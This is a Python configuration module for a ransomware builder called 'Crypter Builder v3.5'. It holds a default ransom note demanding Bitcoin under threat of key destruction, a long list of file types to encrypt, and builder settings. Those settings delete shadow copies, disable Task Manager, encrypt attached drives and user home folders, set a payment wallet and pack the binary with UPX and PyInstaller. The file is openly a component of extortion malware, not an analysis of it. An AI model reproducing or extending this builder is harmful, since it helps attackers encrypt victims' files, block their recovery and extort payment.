# -*- coding: utf-8 -*-
'''
@summary: Crypter Builder: Base schema and config
@author: MLS
'''

# Import libs
import re
import os
from collections import OrderedDict

## VERSION
MAJ_VERSION = "3"
MIN_VERSION = "5"

# TITLE
TITLE = "Crypter Builder v%s.%s" % (MAJ_VERSION, MIN_VERSION)
CRYPTER_FILENAME = "Crypter"

## LANGUAGE
SUPPORTED_LANGUAGES = [
    u"English",
    #u"Русский"
    ]

DEFAULT_LANGUAGE = "English"

# English Form text
english_language_form_labels = {
    "language_settings_sizer": "Language"
    }

## DEFAULT RANSOM MESSAGE
RANSOM_MESSAGE = """The important files on your computer have been encrypted with military grade AES-256 bit encryption.

Your documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.

To acquire this key, transfer the Bitcoin Fee to the specified wallet address before the time runs out.

If you fail to take action within this time window, the decryption key will be destroyed and access to your files will be permanently lost."""

## DEFAULT FILETYPES TO ENCRYPT
ENCRYPTABLE_FILETYPES = [
    # GENERAL FORMATS
    "dat", "keychain", "sdf", "vcf",
    # IMAGE FORMATS
    "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp", "svg",
    "3dm", "3ds", "max", "obj", "dds", "psd", "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "indd",
    "pct",
    # VIDEO FORMATS
    "mp4", "avi", "mkv", "3g2", "3gp", "asf", "flv", "m4v", "mov", "mpg", "rm", "srt", "swf", "vob", "wmv",
    # DOCUMENT FORMATS
    "doc", "docx", "txt", "pdf", "log", "msg", "odt", "pages", "rtf", "tex", "wpd", "wps", "csv", "ged", "key", "pps",
    "ppt", "pptx", "xml", "json", "xlsx", "xlsm", "xlsb", "xls", "mht", "mhtml", "htm", "html", "xltx", "prn", "dif",
    "slk", "xlam", "xla", "ods", "docm", "dotx", "dotm", "xps", "ics",
    # SOUND FORMATS
    "mp3", "aif", "iff", "m3u", "m4a", "mid", "mpa", "wav", "wma",
    # EXE AND PROGRAM FORMATS
    "msi", "php", "apk", "app", "bat", "cgi", "com", "asp", "aspx", "cer", "cfm", "css", "htm", "html",
    "js", "jsp", "rss", "xhtml", "c", "class", "cpp", "cs", "h", "java", "lua", "pl", "py", "sh", "sln", "swift",
    "vb", "vcxproj",
    # GAME FILES
    "dem", "gam", "nes", "rom", "sav",
    # COMPRESSION FORMATS
    "tgz", "zip", "rar", "tar", "7z", "cbr", "deb", "gz", "pkg", "rpm", "zipx", "iso",
    # MISC
    "ged", "accdb", "db", "dbf", "mdb", "sql", "fnt", "fon", "otf", "ttf", "cfg", "ini", "prf", "bak", "old", "tmp",
    "torrent"
    ]


## CONFIGURATION
'''
@summary: The builder configuration dictionary containing the configuration options loaded into the GUI
@note: To add a new field, adjust the GUI form appropriately and add the settings for the new
field to this dictionary
'''
BUILDER_CONFIG_ITEMS = OrderedDict([
    (
        "builder_language", {
            "label": "Builder Language",
            "label_object_name": "BuilderLanguageLabel",
            "input_object_name": "BuilderLanguageChoice",
            "example": "English or Русский",
            "input_requirement": "One of the supported languages",
            "config_area": "Language",
            "validate": False,
            "default": "English"
            }
    ),
    (
        "debug_level", {
            "label": "Debug verbosity level",
            "label_object_name": "DebugLevelLabel",
            "input_object_name": "DebugLevelChoice",
            "example": "0 - Minimal",
            "input_requirement": "Build process debug level",
            "config_area": "Debug",
            "validate": False,
            "default": "1 - Low"
            }
    ),
    (
        "pyinstaller_aes_key", {
            "label": "PyInstaller AES Key",
            "label_object_name": "PyinstallerAesKeyLabel",
            "input_object_name": "PyinstallerAesKeyTextCtrl",
            "regex": re.compile("^([A-Za-z0-9]{16})?$"),
            "example": "093AC769F6557577452E9DB2C74B984A",
            "input_requirement": "A 16 byte(character) string of alphanumeric characters",
            "validate": True,
            "config_area": "Binary Settings"
            }
    ),
    (
        "icon_file", {
            "label": "Icon",
            "label_object_name": "IconLabel",
            "input_object_name": "IconFilePicker",
            "regex": re.compile("^.*$"),
            "example": "C:\\Users\\test\\icon.ico",
            "input_requirement": "A file path pointing to the location of a valid .ico icon file",
            "default": "",
            "validate": True,
            "config_area": "Binary Settings"
            }
    ),
    (
        "upx_dir", {
            "label": "UPX Packer Directory",
            "label_object_name": "UpxDirLabel",
            "input_object_name": "UpxDirPicker",
            "regex": re.compile("^.*$"),
            "example": "C:\\Program Files\\upx394w",
            "input_requirement": "A path pointing to the UPX Packer directory",
            "default": "",
            "validate": True,
            "config_area": "Binary Settings"
            }
    ),
    (
        "open_gui_on_login", {
            "label": "Open GUI on Login",
            "input_object_name": "OpenGuiOnLoginCheckbox",
            "config_area": "Ransomware Settings",
            "validate": False,
            "default": True
            }
    ),
    (
        "time_delay", {
            "label": "Time Delay (s)",
            "input_object_name": "TimeDelayTextCtrl",
            "regex": re.compile("^\d*$"),
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "0"
        }
    ),
    (
        "delete_shadow_copies", {
            "label": "Delete Shadow Copies",
            "input_object_name": "DeleteShadowCopiesCheckbox",
            "config_area": "Ransomware Settings",
            "validate": False,
            "default": True
            }
    ),
    (
        "disable_task_manager", {
            "label": "Disable Task Manager",
            "input_object_name": "DisableTaskManagerCheckbox",
            "config_area": "Ransomware Settings",
            "validate": False,
            "default": False
            }
    ),
    (
        "gui_title", {
            "label": "GUI Title",
            "label_object_name": "GuiTitleLabel",
            "input_object_name": "GuiTitleTextCtrl",
            "regex": re.compile("^.{0,20}$"),
            "example": "CRYPTER",
            "input_requirement": "A Title to display in Crypter GUI",
            "validate": True,
            "default": "CRYPTER",
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "key_destruction_time", {
            "label": "Key Destruction Time(s)",
            "label_object_name": "KeyDestructionTimeLabel",
            "input_object_name": "KeyDestructionTimeTextCtrl",
            "regex": re.compile("^[0-9]*$"),
            "example": "259200",
            "input_requirement": "A valid integer or floating point number",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "259200"
            }
    ),
    (
        "wallet_address", {
            "label": "Wallet Address",
            "label_object_name": "WalletAddressLabel",
            "input_object_name": "WalletAddressTextCtrl",
            "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
            "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
            "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
                                 " characters (26-35 characters in length",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
            }
    ),
    (
        "bitcoin_fee", {
            "label": "Bitcoin Fee",
            "label_object_name": "BitcoinFeeLabel",
            "input_object_name": "BitcoinFeeTextCtrl",
            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
            "example": "0.0897",
            "input_requirement": "A valid integer or floating point number",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "1.0"
            }
     ),
    (
        "encrypt_attached_drives", {
            "label": "Encrypt Attached Drives",
            "input_object_name": "EncryptAttachedDrivesCheckbox",
            "default": True,
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "encrypt_user_home", {
            "label": "Encrypt User Home",
            "input_object_name": "EncryptUserHomeCheckbox",
            "default": True,
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "max_file_size_to_encrypt", {
            "label": "Max File Size to Encrypt",
            "label_object_name": "MaxFileSizeLabel",
            "input_object_name": "MaxFileSizeTextCtrl",
            "regex": re.compile("^[0-9]*$"),
            "input_requirement": "A valid integer",
            "example": "512",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "512"
            }
    ),
    (
        "filetypes_to_encrypt", {
            "label": "Filetypes to Encrypt",
            "label_object_name": "FiletypesToEncryptLabel",
            "input_object_name": "FiletypesToEncryptTextCtrl",
            "regex": re.compile("^([A-Za-z0-9 ]+(,[A-Za-z0-9. ]+)*)?$"),
            "example": "pdf,exe,msi,doc",
            "input_requirement": "A comma-separated list of filetypes to encrypt",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": ",".join(ENCRYPTABLE_FILETYPES)
        }
    ),
    (
        "encrypted_file_extension", {
            "label": "Encrypted File Extension",
            "label_object_name": "EncryptedFileExtensionLabel",
            "input_object_name": "EncryptedFileExtensionTextCtrl",
            "regex": re.compile("^[A-Za-z0-9.]*$"),
            "example": "locked",
            "input_requirement": "A series of alphanumeric character(s)",
            "config_area": "Ransomware Settings",
            "validate": True,
            "default": "locked"
            }
    ),
    (
        "make_gui_resizeable", {
            "label": "Make GUI Resizeable",
            "input_object_name": "MakeGuiResizeableCheckbox",
            "default": False,
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "always_on_top", {
            "label": "Always On Top",
            "input_object_name": "AlwaysOnTopCheckbox",
            "default": False,
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "background_colour", {
            "label": "Background Colour",
            "input_object_name": "BackgroundColourPicker",
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "heading_font_colour", {
            "label": "Heading Font Colour",
            "input_object_name": "HeadingFontColourPicker",
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "primary_font_colour", {
            "label": "Primary Font Colour",
            "input_object_name": "PrimaryFontColourPicker",
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "secondary_font_colour", {
            "label": "Secondary Font Colour",
            "input_object_name": "SecondaryFontColourPicker",
            "validate": False,
            "config_area": "Ransomware Settings"
            }
    ),
    (
        "ransom_message", {
            "label": "Ransom Message",
            "input_object_name": "RansomMessageTextCtrl",
            "regex": re.compile("^.*$", re.MULTILINE),
            "example": "",
            "input_requirement": "Ransom message/note",
            "config_area": "Ransomware Settings",
            "validate": False,
            "default": RANSOM_MESSAGE
        }
    )
    ])

'''
@summary: Runtime configuration items. To be written to the Ransomware's runtime config file
'''
RUNTIME_CONFIG_ITEMS = [
    "gui_title",
    "encrypt_attached_drives",
    "encrypt_user_home",
    "encrypted_file_extension",
    "disable_task_manager",
    "open_gui_on_login",
    "time_delay",
    "wallet_address",
    "bitcoin_fee",
    "key_destruction_time",
    "max_file_size_to_encrypt",
    "filetypes_to_encrypt",
    "ransom_message",
    "make_gui_resizeable",
    "always_on_top",
    "background_colour",
    "heading_font_colour",
    "primary_font_colour",
    "secondary_font_colour",
    "delete_shadow_copies"
    ]

PACKAGE_DIR = os.path.dirname(__file__)
RUNTIME_CONFIG_PATH = os.path.join(PACKAGE_DIR, "Resources", "runtime.cfg")

# ERRORS
ERROR_INVALID_DATA = 13
ERROR_INVALID_CONFIG_FILE = 110
ERROR_CANNOT_WRITE = 80
ERROR_FILE_NOT_FOUND = 2